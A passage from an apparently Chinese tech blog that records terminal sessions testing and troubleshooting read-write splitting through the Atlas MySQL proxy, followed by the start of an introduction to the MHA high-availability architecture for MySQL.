SELECT * FROM pwds | lists the pwds || ADD PWD $pwd | example: &quot;add pwd user:raw_password&quot;, ... || ADD ENPWD $pwd | example: &quot;add enpwd user:encrypted_password&quot;, ... || REMOVE PWD $pwd | example: &quot;remove pwd user&quot;, ... || SAVE CONFIG | save the backends to config file || SELECT VERSION | display the version of Atlas |+----------------------------+---------------------------------------------------------+16 rows in set (0.00 sec)mysql&gt; ^DBye 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 2Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || ha || mysql || performance_schema || sys || testdb |+--------------------+6 rows in set (0.00 sec)mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 4Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || ha || mysql || performance_schema || sys || testdb |+--------------------+6 rows in set (0.00 sec)mysql&gt; show variables like &quot;%general_log%&quot;;+------------------+--------------------------------+| Variable_name | Value |+------------------+--------------------------------+| general_log | OFF || general_log_file | /var/lib/mysql/rhel_sqlsrv.log |+------------------+--------------------------------+2 rows in set (0.00 sec)mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show variables like &quot;%general_log%&quot;;+------------------+--------------------------------+| Variable_name | Value |+------------------+--------------------------------+| general_log | OFF || general_log_file | /var/lib/mysql/rhel_sqlsrv.log |+------------------+--------------------------------+2 rows in set (0.01 sec)mysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P2345 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.ERROR 1045 (28000): password doesn&apos;t match[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -uroot -P1234 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;127.0.0.1:37884&apos; (using password: YES)[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -P2345 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 1Server version: 5.0.99-agent-adminCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;ERROR 1105 (07000): use &apos;SELECT * FROM help&apos; to see the supported commandsmysql&gt; ^DBye[root@ctos7mini bin]&amp; mysql -h127.0.0.1 -P1234 -uroot -pccc.456mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 7Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || ha || mysql || performance_schema || sys || testdb |+--------------------+6 rows in set (0.00 sec)mysql&gt; ^DBye &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x6D4B;&#x8BD5;&#x5728;MySQL&#x4E3B;&#x5E93;&#x548C;&#x4ECE;&#x5E93;&#x5F00;&#x542F;general_log&#x65E5;&#x5FD7;&#xFF0C;&#x6CE8;&#x610F;&#x4E3B;&#x5E93;&#x548C;&#x4ECE;&#x5E93;general_log&#x65E5;&#x5FD7;&#x540D;&#x79F0;&#x4E0D;&#x540C;&#xFF01; &#x4E34;&#x65F6;&#x751F;&#x6548;123456789101112mysql&gt; show variables like &apos;%general_log%&apos;;+------------------+--------------------------------+| Variable_name | Value |+------------------+--------------------------------+| general_log | OFF || general_log_file | /var/lib/mysql/rhel_sqlsrv.log |+------------------+--------------------------------+2 rows in set (0.00 sec)mysql&gt;mysql&gt; set global general_log=ON;Query OK, 0 rows affected (0.00 sec) &#x6C38;&#x4E45;&#x751F;&#x6548;123456[root@rhel7 ~]&amp; echo &quot;general_log=ON&quot; &gt;&gt; /etc/my.cnf[root@rhel7 ~]&amp; echo &quot;general_log_file=/var/lib/mysql/rhel.log&quot; &gt;&gt; /etc/my.cnf[root@rhel_sqlsrv ~]&amp; echo &quot;general_log=ON&quot; &gt;&gt; /etc/my.cnf[root@rhel_sqlsrv ~]&amp; echo &quot;general_log_file=/var/lib/mysql/rhel_sqlsrv.log&quot; &gt;&gt; /etc/my.cnf[root@rhel_sqlsrv ~]&amp; systemctl restart mysqld 12345678910mysql&gt; show variables like &quot;%general_log%&quot;;+------------------+--------------------------+| Variable_name | Value |+------------------+--------------------------+| general_log | ON || general_log_file | /var/lib/mysql/rhel7.log |+------------------+--------------------------+2 rows in set (0.00 sec)mysql&gt; ^DBye &#x6E05;&#x7A7A;&#x6570;&#x636E;&#x5E93;&#x65E5;&#x5FD7;&#xFF1A; 123[root@rhel7 ~]&amp; echo &gt; /var/lib/mysql/rhel7.log[root@rhel_sqlsrv ~]&amp; echo &gt; /var/lib/mysql/rhel_sqlsrv.log &#x6D4B;&#x8BD5;&#xFF1A; Master&#xFF08;rw&#xFF09;:1[root@rhel7 ~]&amp; tail -f /var/lib/mysql/rhel7.log Slave&#xFF08;ro&#xFF09;:1[root@rhel_sqlsrv ~]&amp; tail -f /var/lib/mysql/rhel_sqlsrv.log Atlas:123456789101112131415[root@ctos7mini mysql-proxy]# mysql -h127.0.0.1 -P1234 -uroot -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 9Server version: 5.0.81-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; ro:slave&#x68C0;&#x6D4B;&#x5230;&#x8BFB;&#x64CD;&#x4F5C;1234567[root@rhel_sqlsrv ~]&amp; tail -f /var/lib/mysql/rhel_sqlsrv.log2022-05-07T09:07:23.252345Z 13 Connect root@192.168.73.20 on using TCP/IP2022-05-07T09:07:23.252973Z 13 Query SET CHARACTER_SET_CONNECTION=utf82022-05-07T09:07:23.254053Z 13 Query SET CHARACTER_SET_RESULTS=utf82022-05-07T09:07:23.258100Z 13 Query SET CHARACTER_SET_CLIENT=utf82022-05-07T09:07:23.259321Z 13 Query select @@version_comment limit 1 rw:1[root@rhel7 ~]# tail -f /var/lib/mysql/rhel7.log &#x5728;Atlas&#x8FDB;&#x884C;&#x8BFB;&#x64CD;&#x4F5C;:123456789101112131415161718192021222324252627282930313233343536373839404142mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || ha || mysql || performance_schema || sys || testdb |+--------------------+6 rows in set (0.00 sec)mysql&gt; use testdbReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_testdb |+------------------+| book |+------------------+1 row in set (0.00 sec)mysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 || Linux | 66 | 666 || Unix | 77 | 777 || abc | 123 | 456 || def | 83 | 364 |+-------------------------+-------+-------+8 rows in set (0.01 sec)mysql&gt; Slave&#x68C0;&#x6D4B;&#x5230;&#x8BFB;&#x64CD;&#x4F5C;&#xFF1A;1234567891011121314151617181920[root@rhel_sqlsrv ~]# tail -f /var/lib/mysql/rhel_sqlsrv.log2022-05-07T09:07:23.252345Z 13 Connect root@192.168.73.20 on using TCP/IP2022-05-07T09:07:23.252973Z 13 Query SET CHARACTER_SET_CONNECTION=utf82022-05-07T09:07:23.254053Z 13 Query SET CHARACTER_SET_RESULTS=utf82022-05-07T09:07:23.258100Z 13 Query SET CHARACTER_SET_CLIENT=utf82022-05-07T09:07:23.259321Z 13 Query select @@version_comment limit 12022-05-07T09:13:04.634499Z 13 Query show databases2022-05-07T09:13:09.313174Z 13 Query SELECT DATABASE()2022-05-07T09:13:09.314061Z 13 Init DB testdb2022-05-07T09:13:09.316061Z 13 Init DB testdb2022-05-07T09:13:09.316710Z 13 Query show databases2022-05-07T09:13:09.317592Z 13 Init DB testdb2022-05-07T09:13:09.318360Z 13 Query show tables2022-05-07T09:13:09.319468Z 13 Init DB testdb2022-05-07T09:13:09.320217Z 13 Field List book2022-05-07T09:13:16.960823Z 13 Init DB testdb2022-05-07T09:13:16.962628Z 13 Query show tables2022-05-07T09:13:20.799873Z 13 Init DB testdb2022-05-07T09:13:20.800737Z 13 Query select * from book &#x5728;Atlas&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;1234mysql&gt; insert into book values(&apos;test&apos;, 67, 252);Query OK, 1 row affected (0.01 sec)mysql&gt; Master&#x68C0;&#x6D4B;&#x5230;&#x5199;&#x64CD;&#x4F5C;&#xFF1A;12345678[root@rhel7 ~]# tail -f /var/lib/mysql/rhel7.log2022-05-07T10:59:33.029685Z 4 Connect root@192.168.73.20 on using TCP/IP2022-05-07T10:59:33.030609Z 4 Query SET CHARACTER_SET_CONNECTION=utf82022-05-07T10:59:33.031735Z 4 Query SET CHARACTER_SET_RESULTS=utf82022-05-07T10:59:33.032656Z 4 Query SET CHARACTER_SET_CLIENT=utf82022-05-07T10:59:33.033919Z 4 Init DB testdb2022-05-07T10:59:33.035018Z 4 Query insert into book values(&apos;test&apos;, 67, 252) &#x6545;&#x969C;&#x89E3;&#x51B3;&#x6545;&#x969C;&#x4E00; Atlas&#x8BBF;&#x95EE;&#x5DE5;&#x4F5C;&#x63A5;&#x53E3;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x53EA;&#x6709;&#x4E00;&#x4E2A;information_schema&#xFF0C;&#x4E0D;&#x663E;&#x793A;&#x5176;&#x4ED6;&#x5E93;&#xFF1A; 1234567891011121314151617181920212223[root@ctos7mini mysql-proxy]# mysql -h192.168.73.21 -uroot -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 13Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema |+--------------------+1 row in set (0.00 sec)mysql&gt; ^DBye &#x6545;&#x969C;&#x5206;&#x6790;&#xFF1A; &#x4E3B;&#x4ECE;&#x4E0D;&#x540C;&#x6B65;&#xFF1A;&#x67E5;&#x770B;Slave&#x7684;&#x72B6;&#x6001;&#xFF1A; 123456789101112131415161718192021mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Connecting to master Master_Host: 192.168.73.21 Master_User: root Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000005 Read_Master_Log_Pos: 154 Relay_Log_File: rhel_sqlsrv-relay-bin.000012 Relay_Log_Pos: 4 Relay_Master_Log_File: mysql-bin.000005 Slave_IO_Running: Connecting Slave_SQL_Running: Yes.........................................&#x7701;&#x7565;................................................................... Seconds_Behind_Master: NULLMaster_SSL_Verify_Server_Cert: No Last_IO_Errno: 2003 Last_IO_Error: error connecting to master &apos;root@192.168.73.21:3306&apos; - retry-time: 10 retries: 1 .........................................&#x7701;&#x7565;...................................................................1 row in set (0.00 sec) Atlas&#x6CA1;&#x6709;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x4ECE;&#x8BBF;&#x95EE;Atlas&#x7BA1;&#x7406;&#x63A5;&#x53E3;&#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x670D;&#x52A1;&#x662F;&#x5426;&#x90FD;&#x5728;&#x7EBF; 12345678910111213141516171819202122232425[root@ctos7mini mysql-proxy]# mysql -h127.0.0.1 -P2345 -uroot -ppwdmysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 1Server version: 5.0.99-agent-adminCopyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; select * from backends;+-------------+--------------------+-------+------+| backend_ndx | address | state | type |+-------------+--------------------+-------+------+| 1 | 192.168.73.21:3306 | up | rw || 2 | 192.168.73.22:3306 | down | ro |+-------------+--------------------+-------+------+2 rows in set (0.00 sec)mysql&gt; &#x6839;&#x636E;&#x5B9E;&#x9645;&#x73AF;&#x5883;&#x68C0;&#x67E5;&#xFF0C;&#x4E3B;&#x4ECE;&#x662F;&#x5426;&#x540C;&#x6B65;&#xFF0C;MySQL&#x662F;&#x5426;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7AEF;&#x53E3;&#x662F;&#x5426;&#x5F00;&#x653E;&#x3002; &#x6545;&#x969C;&#x4E8C;&#xFF1A; &#x6570;&#x636E;&#x5E93;&#x80FD;&#x591F;&#x67E5;&#x8BE2;&#xFF0C;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x5199;&#x64CD;&#x4F5C;&#xFF1A; 1234567891011121314151617181920mysql&gt; use testdbDatabase changedmysql&gt; select * from book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 || Linux | 66 | 666 || Unix | 77 | 777 || abc | 123 | 456 || def | 83 | 364 |+-------------------------+-------+-------+8 rows in set (0.00 sec)mysql&gt; insert into `book` values(&apos;test&apos;,24,62);ERROR 1046 (3D000): No database selectedmysql&gt; Master&#x65E5;&#x5FD7;&#xFF1A;122022-05-07T09:24:33.993274Z 17 Query insert into `book` values(&apos;test&apos;,24,62)2022-05-07T09:24:39.346670Z 17 Init DB Access denied for user &apos;root&apos;@&apos;%&apos; to database &apos;testdb&apos; &#x91CD;&#x542F;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL高可用集群架构-MHA架构","date":"2022-06-07T04:45:20.000Z","path":"/posts/db0340bd/","text":"MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;&#x7B80;&#x4ECB;&#xFF1A; MHA&#xFF08;Master High Availability&#xFF09;&#x76EE;&#x524D;&#x5728;MySQL&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x9762;&#x662F;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x6210;&#x719F;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x5B83;&#x7531;&#x65E5;&#x672C;DeNA&#x516C;&#x53F8;youshimaton&#xFF08;&#x73B0;&#x5C31;&#x804C;&#x4E8E;Facebook&#x516C;&#x53F8;&#xFF09;&#x5F00;&#x53D1;&#xFF0C;&#x662F;&#x4E00;&#x5957;&#x4F18;&#x79C0;&#x7684;&#x4F5C;&#x4E3A;MySQL&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x73AF;&#x5883;&#x4E0B;&#x6545;&#x969C;&#x5207;&#x6362;&#x548C;&#x4E3B;&#x4ECE;&#x63D0;&#x5347;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x8F6F;&#x4EF6;&#x3002;&#x5728;MySQL&#x6545;&#x969C;&#x5207;&#x6362;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x80FD;&#x505A;&#x5230;&#x5728;0~30&#x79D2;&#x4E4B;&#x5185;&#x81EA;&#x52A8;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6545;&#x969C;&#x5207;&#x6362;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x80FD;&#x5728;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x771F;&#x6B63;&#x610F;&#x4E49;&#x4E0A;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002; &#x8BE5;&#x8F6F;&#x4EF6;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF1A;MHA Manager&#xFF08;&#x7BA1;&#x7406;&#x8282;&#x70B9;&#xFF09;&#x548C;MHA Node&#xFF08;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF09;&#x3002; MHA Manager&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x90E8;&#x7F72;&#x5728;&#x4E00;&#x53F0;&#x72EC;&#x7ACB;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x7BA1;&#x7406;&#x591A;&#x4E2A;master-slave&#x96C6;&#x7FA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x90E8;&#x7F72;&#x5728;&#x4E00;&#x53F0;slave&#x8282;&#x70B9;&#x4E0A;&#x3002;MHA Node&#x8FD0;&#x884C;&#x5728;&#x6BCF;&#x53F0;MySQL&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;MHA Manager&#x4F1A;&#x5B9A;&#x65F6;&#x63A2;&#x6D4B;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;master&#x8282;&#x70B9;&#xFF0C;&#x5F53;master&#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5C06;&#x6700;&#x65B0;&#x6570;&#x636E;&#x7684;slave&#x63D0;&#x5347;&#x4E3A;&#x65B0;&#x7684;master&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x7684;slave&#x91CD;&#x65B0;&#x6307;&#x5411;&#x65B0;&#x7684;master&#x3002;&#x6574;&#x4E2A;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x8FC7;&#x7A0B;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5B8C;&#x5168;&#x900F;&#x660E;&#x3002; &#x5728;MHA&#x81EA;&#x52A8;&#x6545;&#x969C;&#x5207;&#x6362;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x8BD5;&#x56FE;&#x4ECE;&#x5B95;&#x673A;&#x7684;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x7684;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E22;&#x5931;&#xFF0C;&#x4F46;&#x8FD9;&#x5E76;&#x4E0D;&#x603B;&#x662F;&#x53EF;&#x884C;&#x7684;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x786C;&#x4EF6;&#x6545;&#x969C;&#x6216;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;ssh&#x8BBF;&#x95EE;&#xFF0C;MHA&#x6CA1;&#x6CD5;&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x53EA;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x800C;&#x4E22;&#x5931;&#x4E86;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x3002;&#x4F7F;&#x7528;MySQL 5.5&#x7684;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x6570;&#x636E;&#x4E22;&#x5931;&#x7684;&#x98CE;&#x9669;&#x3002;MHA&#x53EF;&#x4EE5;&#x4E0E;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x3002;&#x5982;&#x679C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;slave&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;&#x6700;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;MHA&#x53EF;&#x4EE5;&#x5C06;&#x6700;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x5E94;&#x7528;&#x4E8E;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x7684;slave&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002; &#x76EE;&#x524D;MHA&#x4E3B;&#x8981;&#x652F;&#x6301;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x7684;&#x67B6;&#x6784;&#xFF0C;&#x8981;&#x642D;&#x5EFA;MHA,&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x590D;&#x5236;&#x96C6;&#x7FA4;&#x4E2D;&#x5FC5;&#x987B;&#x6700;&#x5C11;&#x6709;&#x4E09;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x4E3B;&#x4E8C;&#x4ECE;&#xFF0C;&#x5373;&#x4E00;&#x53F0;&#x5145;&#x5F53;master&#xFF0C;&#x4E00;&#x53F0;&#x5145;&#x5F53;&#x5907;&#x7528;master&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x5145;&#x5F53;&#x4ECE;&#x5E93;&#xFF0C;&#x56E0;&#x4E3A;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x51FA;&#x4E8E;&#x673A;&#x5668;&#x6210;&#x672C;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x6DD8;&#x5B9D;&#x4E5F;&#x5728;&#x8BE5;&#x57FA;&#x7840;&#x4E0A;&#x8FDB;&#x884C;&#x4E86;&#x6539;&#x9020;&#xFF0C;&#x76EE;&#x524D;&#x6DD8;&#x5B9D;TMHA&#x5DF2;&#x7ECF;&#x652F;&#x6301;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;&#x3002;MHA &#x9002;&#x5408;&#x4EFB;&#x4F55;&#x5B58;&#x50A8;&#x5F15;&#x64CE;, &#x53EA;&#x8981;&#x80FD;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5B83;&#x90FD;&#x652F;&#x6301;&#xFF0C;&#x4E0D;&#x9650;&#x4E8E;&#x652F;&#x6301;&#x4E8B;&#x7269;&#x7684; innodb &#x5F15;&#x64CE;&#x3002; &#x5B98;&#x65B9;&#x4ECB;&#x7ECD;&#xFF1A;https://code.google.com/p/mysql-master-ha/ &#x56FE;01&#x5C55;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x901A;&#x8FC7;MHA Manager&#x7BA1;&#x7406;&#x591A;&#x7EC4;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x3002;&#x53EF;&#x4EE5;&#x5C06;MHA&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x603B;&#x7ED3;&#x4E3A;&#x5982;&#x4E0B;&#xFF1A; &#xFF08;1&#xFF09;&#x4ECE;&#x5B95;&#x673A;&#x5D29;&#x6E83;&#x7684;master&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#xFF08;binlog events&#xFF09;; &#xFF08;2&#xFF09;&#x8BC6;&#x522B;&#x542B;&#x6709;&#x6700;&#x65B0;&#x66F4;&#x65B0;&#x7684;slave&#xFF1B; &#xFF08;3&#xFF09;&#x5E94;&#x7528;&#x5DEE;&#x5F02;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF08;relay log&#xFF09;&#x5230;&#x5176;&#x4ED6;&#x7684;slave&#xFF1B; &#xFF08;4&#xFF09;&#x5E94;&#x7528;&#x4ECE;master&#x4FDD;&#x5B58;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#xFF08;binlog events&#xFF09;&#xFF1B; &#xFF08;5&#xFF09;&#x63D0;&#x5347;&#x4E00;&#x4E2A;slave&#x4E3A;&#x65B0;&#x7684;master&#xFF1B; &#xFF08;6&#xFF09;&#x4F7F;&#x5176;&#x4ED6;&#x7684;slave&#x8FDE;&#x63A5;&#x65B0;&#x7684;master&#x8FDB;&#x884C;&#x590D;&#x5236;&#xFF1B; MHA&#x8F6F;&#x4EF6;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;Manager&#x5DE5;&#x5177;&#x5305;&#x548C;Node&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#x3002; MHA Manager&#x5DE5;&#x5177;&#x5305;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;Manager&#x5DE5;&#x5177;&#x5305;&#x548C;Node&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#x3002; Manager&#x5DE5;&#x5177;&#x5305;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A; &#x540D; &#x79F0; &#x4F5C; &#x7528; masterha_check_ssh &#x68C0;&#x67E5;MHA&#x7684;SSH&#x914D;&#x7F6E;&#x72B6;&#x51B5; masterha_check_repl &#x68C0;&#x67E5;MySQL&#x590D;&#x5236;&#x72B6;&#x51B5; masterha_manager &#x542F;&#x52A8;MHA masterha_check_status &#x68C0;&#x6D4B;&#x5F53;&#x524D;MHA&#x8FD0;&#x884C;&#x72B6;&#x6001; masterha_master_monitor &#x68C0;&#x6D4B;master&#x662F;&#x5426;&#x5B95;&#x673A; masterha_master_switch 